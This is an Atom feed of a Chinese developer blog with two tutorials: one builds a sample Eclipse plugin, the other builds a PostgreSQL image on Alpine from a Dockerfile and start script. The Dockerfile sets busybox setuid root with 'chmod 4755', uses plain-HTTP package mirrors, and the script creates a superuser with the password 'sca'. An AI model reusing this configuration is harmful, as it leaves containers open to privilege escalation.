<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fire Flying&#39;s blog</title>
  
  
  <link href="http://fireflyingup.github.io/atom.xml" rel="self"/>
  
  <link href="http://fireflyingup.github.io/"/>
  <updated>2022-06-23T17:19:21.848Z</updated>
  <id>http://fireflyingup.github.io/</id>
  
  <author>
    <name>Fire Flying</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>搭建一个简单eclipse插件项目</title>
    <link href="http://fireflyingup.github.io/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/"/>
    <id>http://fireflyingup.github.io/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/</id>
    <published>2022-06-23T15:36:14.000Z</published>
    <updated>2022-06-23T17:19:21.848Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>​    这里主要记录如何手把手搭建一个eclipse的插件项目。</p><h2 id="引入插件"><a href="#引入插件" class="headerlink" title="引入插件"></a>引入插件</h2><p>​    由于eclipse插件开发需要plugin插件，所以要先去Help-&gt;Install New Software-&gt;选择对应ecipse版本的<a href="https://download.eclipse.org/releases/2022-06/202206151000%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80-&gt;%E9%80%89%E6%8B%A9General">https://download.eclipse.org/releases/2022-06/202206151000下载地址-&gt;选择General</a> Purpose Tools下的Eclipse Plug-in Development Environment，然后一路next-&gt;accept-&gt;finish，重启就可以创建一个plugin项目了。</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001026541.png" alt="image-20220624001026541"></p><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><p>填入项目名称</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001331584.png" alt="image-20220624001331584"></p><p>点击next，填写vender信息，勾选Generate an activator</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001525493.png" alt="image-20220624001525493"></p><p>点击next，选择创建一个模版，这里选择hello world。</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624001841133.png" alt="image-20220624001841133"></p><p>点击next，构建一个handler。</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624002001614.png" alt="image-20220624002001614"></p><p>创建完之后我们看下目录结构</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624004252862.png" alt="image-20220624004252862"></p><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>目录里面主要的是plugin.xml这个文件，下面对这个文件进行解析，梳理页面与执行SampleHandler的逻辑。</p><p>plugin.xml文件如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">&lt;?eclipse version=&quot;3.4&quot;?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.commands&quot;&gt;</span><br><span class="line">      &lt;category</span><br><span class="line">            id=&quot;demo1.commands.category&quot;</span><br><span class="line">            name=&quot;Sample Category&quot;&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 这里定义一个command id为demo1.commands.sampleCommand --&gt;</span></span><br><span class="line">      &lt;command</span><br><span class="line">            categoryId=&quot;demo1.commands.category&quot;</span><br><span class="line">            name=&quot;Sample Command&quot;</span><br><span class="line">            id=&quot;demo1.commands.sampleCommand&quot;&gt; </span><br><span class="line">      <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.handlers&quot;&gt;</span><br><span class="line">     <span class="comment">&lt;!-- 将上面定义的command 指定handler处理器，也就是SampleHandler这个类 --&gt;</span></span><br><span class="line">      &lt;handler</span><br><span class="line">            class=&quot;demo1.handlers.SampleHandler&quot;</span><br><span class="line">            commandId=&quot;demo1.commands.sampleCommand&quot;&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.bindings&quot;&gt;</span><br><span class="line">      &lt;key</span><br><span class="line">            commandId=&quot;demo1.commands.sampleCommand&quot;</span><br><span class="line">            schemeId=&quot;org.eclipse.ui.defaultAcceleratorConfiguration&quot;</span><br><span class="line">            contextId=&quot;org.eclipse.ui.contexts.window&quot;</span><br><span class="line">            sequence=&quot;M1+6&quot;&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.menus&quot;&gt;</span><br><span class="line">      &lt;menuContribution</span><br><span class="line">            locationURI=&quot;menu:org.eclipse.ui.main.menu?after=additions&quot;&gt;</span><br><span class="line">        <span class="comment">&lt;!-- 指定一个菜单，菜单显示为Sample Menu --&gt;</span></span><br><span class="line">         &lt;menu</span><br><span class="line">               id=&quot;demo1.menus.sampleMenu&quot;</span><br><span class="line">               label=&quot;Sample Menu&quot;</span><br><span class="line">               mnemonic=&quot;M&quot;&gt;</span><br><span class="line">           <span class="comment">&lt;!-- 将前面注册的command绑定到这个菜单里面 --&gt;</span></span><br><span class="line">            &lt;command</span><br><span class="line">                  commandId=&quot;demo1.commands.sampleCommand&quot;</span><br><span class="line">                  id=&quot;demo1.menus.sampleCommand&quot;</span><br><span class="line">                  mnemonic=&quot;S&quot;&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">menuContribution</span>&gt;</span></span><br><span class="line">      &lt;menuContribution</span><br><span class="line">            locationURI=&quot;toolbar:org.eclipse.ui.main.toolbar?after=additions&quot;&gt;</span><br><span class="line">         &lt;toolbar</span><br><span class="line">               id=&quot;demo1.toolbars.sampleToolbar&quot;&gt;</span><br><span class="line">            &lt;command</span><br><span class="line">                  id=&quot;demo1.toolbars.sampleCommand&quot;</span><br><span class="line">                  commandId=&quot;demo1.commands.sampleCommand&quot;</span><br><span class="line">                  icon=&quot;icons/sample.png&quot;</span><br><span class="line">                  tooltip=&quot;Say hello world&quot;&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">toolbar</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">menuContribution</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SampleHandler.java 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1.handlers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.commands.AbstractHandler;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.commands.ExecutionEvent;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.commands.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.ui.IWorkbenchWindow;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.ui.handlers.HandlerUtil;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jface.dialogs.MessageDialog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SampleHandler</span> <span class="keyword">extends</span> <span class="title">AbstractHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">(ExecutionEvent event)</span> <span class="keyword">throws</span> ExecutionException </span>&#123;</span><br><span class="line">IWorkbenchWindow window = HandlerUtil.getActiveWorkbenchWindowChecked(event);</span><br><span class="line">    <span class="comment">// 推送弹窗，打印Hello, This is a demo plugin!!!</span></span><br><span class="line">MessageDialog.openInformation(</span><br><span class="line">window.getShell(),</span><br><span class="line"><span class="string">&quot;Demo1&quot;</span>,</span><br><span class="line"><span class="string">&quot;Hello, This is a demo plugin!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一个Activator类，这个是对插件的生命周期进行管理</p><table><thead><tr><th>getDefault()</th><th>取得插件类的实例的方法。插件类是单例的，所以这个方法作为一个静态方法提供。</th></tr></thead><tbody><tr><td>start()</td><td>插件开始时的处理。</td></tr><tr><td>stop()</td><td>插件停止时的处理。</td></tr><tr><td>getLog()</td><td>log输出时取得ILog用的方法。</td></tr><tr><td>getImageRegistry()</td><td>取得管理插件内图像的ImageRegistry类。</td></tr><tr><td>getPerferenceStore()</td><td>取得保存插件设定的IPerferenceStore类。</td></tr><tr><td>getDialogSettings()</td><td>取得保存对话框设定的IDialogSettings类。</td></tr><tr><td>getWorkbench()</td><td>取得IWorkbench的实例。</td></tr></tbody></table><h2 id="执行调试插件"><a href="#执行调试插件" class="headerlink" title="执行调试插件"></a>执行调试插件</h2><p>点击左上角的绿色启动按钮</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624005737022.png" alt="image-20220624005737022"></p><p>可以看到会新打开一个带有插件的eclipse，可以看到在菜单栏已经有变化，就是插件生效了</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624005931465.png" alt="image-20220624005931465"></p><p>接下来我们点击菜单栏的Sample Command，可以看到以下输出</p><p><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624010043268.png" alt="image-20220624010043268"></p><p>到此，一个简单的eclipse插件就开发完毕了。</p><p>参考链接：</p><p>引入插件：<a href="https://blog.csdn.net/feinifi/article/details/103088082">https://blog.csdn.net/feinifi/article/details/103088082</a></p><p>插件开发：<a href="https://www.cnblogs.com/liuzhuo">https://www.cnblogs.com/liuzhuo</a></p><p>插件开发：<a href="https://blog.csdn.net/feinifi/article/details/106773644">https://blog.csdn.net/feinifi/article/details/106773644</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;​    这里主要记录如何手把手搭建一个eclipse的插件项目。&lt;/p&gt;
&lt;h2 id=&quot;引入插件&quot;&gt;&lt;a href=&quot;#引入插件&quot; cl</summary>
      
    
    
    
    <category term="eclipse plugins" scheme="http://fireflyingup.github.io/categories/eclipse-plugins/"/>
    
    
    <category term="eclipse" scheme="http://fireflyingup.github.io/tags/eclipse/"/>
    
    <category term="插件" scheme="http://fireflyingup.github.io/tags/%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile基于alpine构建postgresql镜像</title>
    <link href="http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BApostgresql%E9%95%9C%E5%83%8F/"/>
    <id>http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BApostgresql%E9%95%9C%E5%83%8F/</id>
    <published>2022-06-21T15:49:26.000Z</published>
    <updated>2022-06-25T03:00:45.901Z</updated>
    
    <content type="html"><![CDATA[<h2 id="坏境"><a href="#坏境" class="headerlink" title="坏境"></a>坏境</h2><p>docker：20.10.10</p><p>nginx：1.18.0</p><p>podtgres：10.21</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。</p><p>准备pgsql的源码包(<a href="https://ftp.postgresql.org/pub/source/v10.21/postgresql-10.21.tar.gz">版本直达</a>)，也可以去<a href="https://www.postgresql.org/ftp/source/">pgsql官网</a>处自行下载对应的版本。</p><p>准备一个初始化脚本，主要用于创建数据库，用户等等。</p><p>准备完之后文件里面内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╰─$ ls -al</span><br><span class="line">total 50152</span><br><span class="line">drwxr-xr-x  8 guoying  staff       256 Jun 21 11:42 .</span><br><span class="line">drwxr-xr-x  7 guoying  staff       224 Jun 22 15:06 ..</span><br><span class="line">-rw-r--r--  1 guoying  staff      1408 Jun 21 22:45 Dockerfile</span><br><span class="line">-rw-r--r--  1 guoying  staff    108622 Jun 21 11:38 data.sql</span><br><span class="line">-rw-r--r--  1 guoying  staff       640 Jun 21 16:07 start.sh</span><br><span class="line">-rw-r--r--  1 guoying  staff      2897 Jun 21 11:38 index.sql</span><br><span class="line">-rw-r--r--  1 guoying  staff    128105 Jun 21 11:38 initdb.sql</span><br><span class="line">-rw-r--r--@ 1 guoying  staff  25419930 Jun 21 09:29 postgresql-10.21.tar.gz</span><br></pre></td></tr></table></figure><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>这里直接展示整个dockerfile文件，已经对应的注释</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build pgsql</span></span><br><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> <span class="keyword">user</span>=postgres</span><br><span class="line"><span class="keyword">ARG</span> group=postgres</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将必要文件移入镜像</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> postgresql-10.21.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建组和用户 ps：pgsql不允许非root安装</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> addgroup -S <span class="variable">$&#123;group&#125;</span> &amp;&amp; adduser \</span></span><br><span class="line"><span class="bash">    --disabled-password \</span></span><br><span class="line"><span class="bash">    --gecos <span class="string">&quot;&quot;</span> \</span></span><br><span class="line"><span class="bash">    --home <span class="string">&quot;/home/postgres&quot;</span> \</span></span><br><span class="line"><span class="bash">    --ingroup <span class="string">&quot;<span class="variable">$&#123;group&#125;</span>&quot;</span> \</span></span><br><span class="line"><span class="bash">    --no-create-home \</span></span><br><span class="line"><span class="bash">    <span class="comment"># --uid &quot;$UID&quot; \</span></span></span><br><span class="line"><span class="bash">    <span class="string">&quot;<span class="variable">$&#123;user&#125;</span>&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 指定apk的aliyun源</span></span></span><br><span class="line">    echo <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span><br><span class="line">    echo <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/repositories &amp;&amp; \</span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    <span class="comment"># 安装所需要的环境</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> --no-cache --virtual .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    readline-dev \</span></span><br><span class="line"><span class="bash">    zlib-dev &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> /postgresql-10.21 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 编译 指定端口8888</span></span></span><br><span class="line">    ./configure --prefix=/sca/postgresql --with-pgport=<span class="number">8888</span> &amp;&amp; \</span><br><span class="line">    make &amp;&amp; make install &amp;&amp; \</span><br><span class="line">    <span class="comment"># 删除缓存和不用的文件</span></span><br><span class="line">    rm -rf /postgresql-<span class="number">10.21</span> &amp;&amp; \</span><br><span class="line">    rm -rf /var/lib/apk/* &amp;&amp; \</span><br><span class="line">    rm -rf /tmp/* &amp;&amp; \</span><br><span class="line">    apk del .build-deps \</span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make &amp;&amp; \</span><br><span class="line">    <span class="comment"># 重新安装运行所需要的依赖</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> readline-dev &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 创建数据目录，pgsql的data会放在这个目录里面</span></span></span><br><span class="line">    mkdir /sca/data &amp;&amp; \</span><br><span class="line">    <span class="comment"># 赋予权限</span></span><br><span class="line">    chown -R $&#123;<span class="keyword">user</span>&#125;:$&#123;<span class="keyword">user</span>&#125; /sca &amp;&amp; \</span><br><span class="line">    chmod <span class="number">4755</span> /bin/busybox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定postgres用户</span></span><br><span class="line"><span class="keyword">USER</span> $&#123;<span class="keyword">user</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传递初始化sql和脚本到/sca目录下</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./initdb.sql /sca</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./data.sql /sca</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./start.sh /sca</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露你的端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意这个-w，得要。</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/postgresql/bin/pg_ctl&quot;</span>, <span class="string">&quot;-D&quot;</span>, <span class="string">&quot;/sca/data&quot;</span>, <span class="string">&quot;-w&quot;</span>, <span class="string">&quot;start&quot;</span> ]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">port=8888</span><br><span class="line">data=/sca/data</span><br><span class="line">binpath=/sca/postgresql/bin</span><br><span class="line"><span class="comment"># 判断是否存在posegresql.conf 从而判断是否已经构建完初始化数据库</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$&#123;data&#125;</span>/postgresql.conf&quot;</span> ];<span class="keyword">then</span> </span><br><span class="line"> <span class="comment"># 调用initdb 构建初始化数据库</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;initdb begin&quot;</span> </span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/initdb -D <span class="variable">$&#123;data&#125;</span></span><br><span class="line">    <span class="built_in">echo</span> 1 &gt; <span class="variable">$&#123;data&#125;</span>/.init</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;initdb end&quot;</span> </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入初始化数据</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$&#123;data&#125;</span>/.init&quot;</span> ];<span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;start data install&quot;</span></span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/pg_ctl -D <span class="variable">$&#123;data&#125;</span> -w start </span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -p<span class="variable">$&#123;port&#125;</span> -c <span class="string">&quot;create role sca with superuser login password &#x27;sca&#x27;&quot;</span> -d postgres</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/createdb -p<span class="variable">$&#123;port&#125;</span> --encoding=UTF8 --owner=sca -e sca</span><br><span class="line">    <span class="comment"># $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create extension pgcrypto;&quot; -d sca</span></span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -Usca -dsca -p<span class="variable">$&#123;port&#125;</span> -a -f /sca/initdb.sql 1&gt;/dev/null</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -Usca -dsca -p<span class="variable">$&#123;port&#125;</span> -a -f /sca/data.sql 1&gt;/dev/null</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -p<span class="variable">$&#123;port&#125;</span> -c <span class="string">&quot;alter user sca with nosuperuser&quot;</span> -d postgres</span><br><span class="line">    rm -rf /sca/dbinit.sh</span><br><span class="line">    rm -rf /sca/data.sql</span><br><span class="line">    rm -rf /sca/initdb.sql</span><br><span class="line">    rm -rf <span class="variable">$&#123;data&#125;</span>/.init</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/pg_ctl -D <span class="variable">$&#123;data&#125;</span> -m fast -w stop </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;end data install&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动pgsql，这里用pg_ctl会启动不了容器（原因不知，可能和进程有关）</span></span><br><span class="line"><span class="built_in">exec</span> <span class="variable">$&#123;binpath&#125;</span>/postgres -D <span class="variable">$&#123;data&#125;</span></span><br></pre></td></tr></table></figure><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>docker build -t fire-pgsql:v1.0.0 .</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>创建普通用户（无密码）：<a href="https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image">https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;坏境&quot;&gt;&lt;a href=&quot;#坏境&quot; class=&quot;headerlink&quot; title=&quot;坏境&quot;&gt;&lt;/a&gt;坏境&lt;/h2&gt;&lt;p&gt;docker：20.10.10&lt;/p&gt;
&lt;p&gt;nginx：1.18.0&lt;/p&gt;
&lt;p&gt;podtgres：10.21&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/categories/dockerfile/"/>
    
    
    <category term="源码编译" scheme="http://fireflyingup.github.io/tags/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    
    <category term="postgresql" scheme="http://fireflyingup.github.io/tags/postgresql/"/>
    
    <category term="docker" scheme="http://fireflyingup.github.io/tags/docker/"/>
    
    <category term="alpine" scheme="http://fireflyingup.github.io/tags/alpine/"/>
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/tags/dockerfile/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile基于alpine构建nginx镜像</title>
    <link href="http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAnginx%E9%95%9C%E5%83%8F/"/>
